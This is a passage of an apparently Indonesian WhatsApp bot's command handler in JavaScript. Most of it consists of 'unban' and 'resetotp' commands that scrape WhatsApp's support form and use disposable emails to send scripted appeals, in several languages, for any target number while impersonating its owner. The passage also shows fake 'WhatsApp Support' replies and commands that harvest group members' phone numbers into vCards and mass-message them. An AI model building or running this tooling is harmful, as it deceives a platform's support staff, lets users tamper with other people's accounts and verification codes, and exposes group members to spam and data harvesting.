Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'unbanned3': case 'unban3': {
if (!isCreator && global.db.data.users[m.sender].limit < 1000) return replyv1(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 1000
                replyv1(`🚩 1000 Limit Used`)
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `hello whatsapp My WhatsApp number has been blocked but I have never violated WhatsApp policy, please reactivate my number as soon as possible because I use this number for my business and it contains a lot of my personal data Please help whatsapp.My number : +[${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break
case 'getcontact': case 'getkontak':
if (!m.isGroup) return replywalu(mess.group)
if (!(isGroupAdmins || isCreator)) return replywalu('admin_only')
huhuhs = await vinz.sendMessage(m.chat, {
    text: `Grup; *${groupMetadata.subject}*\nTotal peserta; *${participants.length}*`
}, {quoted: m, ephemeralExpiration: 86400})
await sleep(1000) // (?); mengirim kontak seluruh member
vinz.sendContact(m.chat, participants.map(a => a.id), huhuhs)
break

case 'savekontak': case 'svkontak':
if (!m.isGroup) return replywalu(mess.group)
if (!(isGroupAdmins || isCreator)) return replywalu('admin_only')
let cmiggc = await vinz.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} 
let nmfilect = './contacts.vcf'
replywalu('Mengimpor '+cmiggc.participants.length+' kontak..')
require('fs').writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
vinz.sendMessage(m.chat, {
    document: require('fs').readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'Group: *'+cmiggc.subject+'*\nParticipants total: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
require('fs').unlinkSync(nmfilect)
break
case 'getcase': case 'case': try {
	if (!isCreator) return replywalu(mess.owner)
	if (!dtext) return replywalu('nama_case?')
	const getCase = (dtext) => {
		return "case " + `'${dtext}'` + require('fs').readFileSync("vinz.js").toString().split('case \''+ dtext +'\'')[1].split("break")[0]+"break"
	} 
	replywalu(getCase(dtext))
} catch {
	replywalu('not_found')
}
break
case 'pushkontak':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
if (!m.isGroup) return replywalu(mess.group)
if (!dtext) return replywalu('Ex: !pushkontak teksnya')
	let pkDetect = await vinz.groupMetadata(m.chat)
	if (pkDetect.participants.length > 200) return replywalu('member maksimal; 200')
	replywalu('Mengirim pesan ke '+pkDetect.participants.length+' kontak..')
	for (let a of pkDetect.participants) {
	vinz.sendMessage(a.id, {text: dtext})
	await sleep(500)
} 
replywalu('Group: *'+pkDetect.subject+'*\nTotal peserta; '+pkDetect.participants.length+'\n\nText;\n'+dtext+'\n\ndelay: 500ms\nmsg_success')
break

case 'pushkontak2':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
	let phkid = dtext.split('|')[0]
	let phktxt = dtext.split('|')[1]
if (!phkid) return replywalu('Ex: !pushkontak2 idGrup|text')
if (!phktxt) return replywalu('Ex: !pushkontak2 idGrup|text')
	let pk2Detect = await vinz.groupMetadata(phkid)
	if (pk2Detect.participants.length > 200) return replywalu('member maksimal; 200')
	replywalu('Mengirim pesan ke '+pk2Detect.participants.length+' kontak..')
	for (let a of pk2Detect.participants) {
	vinz.sendMessage(a.id, {text: phktxt})
	await sleep(500)
} 
replywalu('Group: *'+pk2Detect.subject+'*\nTotal peserta; '+pk2Detect.participants.length+'\n\nText;\n'+phktxt+'\n\ndelay: 500ms\nmsg_success')
break

case 'grouplist': case 'listgrup': case 'listgc': case 'idgrup':
if (!isCreator) return replyv1('𝙺𝚑𝚞𝚜𝚞𝚜 𝙿𝚛𝚎𝚖𝚒𝚞𝚖!')
let getGroups = await vinz.groupFetchAllParticipating()
let gclish = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let gclist = gclish.map(v => v.id)
if (gclist.length > 20) return replywalu(jsonformat(gclist))
let gctext = `Daftar Chat grup; (total: ${gclist.length})`
for (let a of gclist) {
	let mdata = await vinz.groupMetadata(a)
	gctext += `\n\nSubject: *${mdata.subject}*\nTotal peserta: ${mdata.participants.length}\niD: ${mdata.id}`
} 
replywalu(gctext)
break

case 'sendkontag': case 'kontag':
if (!m.isGroup) return replywalu(mess.group)
if (!(isGroupAdmins || isCreator)) return replywalu('admin_only')
if (!m.mentionedJid[0]) return replywalu('Ex; .kontak @tag|nama')
let sngTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let sngContact = {
	displayName: "Contact", contacts: [{displayName: sngTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+sngTak+";;;\nFN:"+sngTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} 
vinz.sendMessage(m.chat, {contacts: sngContact, mentions: participants.map(a => a.id)}, {ephemeralExpiration: 86400})
break

case 'sendkontak': case 'kontak':
if (!m.isGroup) return replywalu(mess.group)
if (!m.mentionedJid[0]) return replywalu('Ex; .kontak @tag|nama')
let snTak = dtext.split(' ')[1] ? dtext.split(' ')[1] : 'Contact'
let snContact = {
	displayName: "Contact", contacts: [{displayName: snTak, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+snTak+";;;\nFN:"+snTak+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} 
vinz.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400, quoted: m})
break
case 'unbanned5': case 'unban5': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19561.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007887737")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replywalu(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replywalu(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replywalu(util.format(res.data))
} catch (err) {replywalu(`${err}`)}
} else replywalu('Masukkan nomor target!')
}
break
//=================================================
case 'unban6': case 'unbanned6': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19561.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007887737")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replywalu(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replywalu(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replywalu(util.format(res.data))
} catch (err) {replywalu(`${err}`)}
} else replywalu('Masukkan nomor target!')
}
break
//=================================================
case 'unbanned7': case 'unban7': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19561.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007887737")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replywalu(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replywalu(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replywalu(util.format(res.data))
} catch (err) {replywalu(`${err}`)}
} else replywalu('Masukkan nomor target!')
}
break
//=================================================
case 'unbanned8': case 'unban8': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19561.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007887737")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
replywalu(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan Vinz X7😁`)
await loading(9000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
replywalu(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
replywalu(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else replywalu(util.format(res.data))
} catch (err) {replywalu(`${err}`)}
} else replywalu('Masukkan nomor target!')
}
break
case 'unbanned9': case 'unban9': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет WhatsApp Мой номер WhatsApp был заблокирован без причины. Пожалуйста, повторно активируйте мой номер WhatsApp, так как этот номер содержит много моей личной информации, которую я храню на этом номере, а также использую этот номер для своей офисной работы, что очень важно. Пожалуйста, активируйте мой номер WhatsApp как можно скорее. Спасибо.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor!')
}
break
//=================================================
case 'unban10': case 'unbanned10': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Привет, поддержка WhatsApp. Несколько дней назад я открыл приложение WhatsApp, но получил уведомление о том, что моя учетная запись WhatsApp не авторизована, и попросил зарегистрировать новый номер телефона. Почему мой номер не может использовать WhatsApp? Я считаю, что я никогда не нарушал политику WhatsApp, никогда не причинял вреда другим пользователям WhatsApp и использую WhatsApp только для бизнеса своей компании. Пожалуйста, повторно активируйте мой номер WhatsApp, поскольку этот номер содержит важные данные для моего бизнеса и деятельности. Пожалуйста, обработайте мой запрос как можно быстрее.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor!')
}
break
//=================================================
case 'unbanned11': case 'unban11': {
if (!isCreator) return
if (m.quoted || dtext) {
var tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return replywalu(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Здравствуйте, доброе утро, WhatsApp. Я пользователь WhatsApp со следующим номером ${targetnya}. У меня возникла проблема с блокировкой моего номера WhatsApp. Когда я открыл приложение WhatsApp, я получил уведомление: «Эта учетная запись не может использовать приложение WhatsApp». Раньше я отправлял сообщения в чат своей семье только во время работы. и я не считаю, что совершил какое-либо нарушение условий обслуживания WhatsApp. Приношу извинения, я рассматриваю возможность повторной активации заблокированной учетной записи WhatsApp. Спасибо`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19561.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007887737")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Please wait for the unbanned process for 12 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor!')
}
break
case 'resetotp': {
if (!isCreator) return
if (m.quoted || dtext) {
tosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
targetnya = tosend.split('@')[0]

try {
axioss = require('axios')
ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=199999999999999999995777678776668876677777")
cookie = ntah.headers["set-cookie"].join("; ")
cheerio = require('cheerio');
$ = cheerio.load(ntah.data)
$form = $("form");
url = new URL($form.attr("action"), "https://www.whatsapp.com").href
form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Olá, suporte pelo WhatsApp. Alguém tentou fazer login na minha conta do Whatsapp, então estou desconectado da minha conta do Whatsapp, mas infelizmente não consigo mais fazer login na minha conta do Whatsapp porque tenho que esperar 12 horas para receber o código de verificação. Por favor, redefina meu código de verificação do WhatsApp.`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19531.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007735016")
form.append("__comment_req", "0")

res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`i have reset the otp on that number and remember it only works if the otp is more than 3 hours🥺🙏`)
payload = String(res.data)
if (payload.includes(`"payload":true`)) {
} else if (payload.includes(`"payload":false`)) {
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor!')
}
break
case "call":
if (!isCreator) return replyv1(`*khusus Premium*`)
await loading()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6281214281312`)
let nosend = m.quoted ? m.quoted.sender : dtext.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (args[0].startsWith(`+6281214281312`)) return reply('Tidak bisa call ke nomor ini!')
